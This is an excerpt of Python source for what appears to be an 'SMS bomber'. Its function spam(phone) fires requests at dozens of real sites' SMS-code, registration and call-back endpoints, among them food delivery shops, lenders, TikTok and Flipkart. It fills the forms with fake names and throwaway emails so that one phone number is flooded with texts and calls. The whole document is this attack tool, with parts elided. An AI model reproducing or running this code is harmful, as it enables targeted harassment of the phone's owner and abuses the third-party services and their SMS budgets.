...
def spam(phone: int):
    ...
    try:
        ...
        requests.post("https://yaponchik.net/login/login.php",
                      data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/", "phone": phone,
                            "code": ""})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create",
                      json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": phone,
                            "email": secmail.SecMail().generate_email(), "smsCode": ""})
    except:
        pass
    try:
    ...
    try:
        # под сомнением
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action": "auth", "phone": phone})

        requests.post("https://www.r-ulybka.ru/login/form_ajax.php",
                      data={"phone": phone, "action": "sendSmsAgain"})
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code", data={"phone": phone})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://m.tiktok.com/node-a/send/download_link",
                      json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone,
    ...
    try:
        requests.post("https://www.tanuki.ru/api/", json={
            "header": {"version": "2.0", "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
                       ...
                       "cityId": "9", }, "method": {"name": "sendSmsCode"}, "data": {"phone": phone, "type": 1}})
    except:
        pass
    try:
    ...
    try:
        ...
        pass
    try:
        requests.post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": phone, "name": "Иван"}, )
    except:
        pass
    try:
    ...
    try:
        requests.get("https://auth.pizza33.ua/ua/join/check/",
                     params={"callback": "angular.callbacks._1", "email": secmail.SecMail().generate_email(),
                             "password": "123456789", "phone": phone,
                             "utm_current_visit_started": 0, "utm_first_visit": 0, "utm_previous_visit": 0,
                             "utm_times_visited": 0})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://pizzasushiwok.ru/index.php",
                      data={"mod_name": "registration", "tpl": "restore_password", "phone": phone})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",
                      data={"data": {"login": phone, "check": True, "crypto": {"captcha": "739699"}}})
    except:
        pass
    try:
        ...
        pass
    try:
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone, "c": "3"}, )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
                      data={"AUTH_ACTION": "SEND_USER_CODE", "phone": phone})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://pizzasushiwok.ru/index.php",
                      data={"mod_name": "call_me", "task": "request_call", "name": "Иван", "phone": phone})
    except:
        pass
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://paylate.ru/registry",
                      data={"mobile": phone, "first_name": "Иван", "last_name": "Окуров", "nick_name": "Ivan",
                            "gender-client": 1, "email": secmail.SecMail().generate_email(), "action": "registry"})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
                      data={"telephone": "8" + phone})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",
                      data={"name": "Auth.SendPassword", "params[0]": phone})
    except:
        pass
    try:
    ...
    try:
        requests.get("https://okeansushi.ru/includes/contact.php",
                     params={"call_mail": "1", "ajax": "1", "name": "Ivan", "phone": phone, "call_time": "1",
                             "pravila2": "on"})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",
                      json={"url": "/api/client/phone_verification", "method": "POST",
                            ...
                            "headers": {"Client-Id": 5646981, "Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
    ...
    try:
        requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
                      ...
                      json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                            ...
                            "SecondName": name, "Phone": phone, "Email": email})
    except:
        pass
    try:
    ...
    try:
        ...
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com",
    ...
    try:
        requests.post("https://e-groshi.com/online/reg",
                      data={"first_name": name, "last_name": name, "third_name": name, "phone": phonemas,
    ...
    try:
        ...
        pass
    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone},
    ...
    try:
        requests.post("https://apteka.ru/_action/auth/getForm/",
                      data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                            "form[EMAIL]": "", "form[LOGIN]": phonemas, "form[PASSWORD]": password,
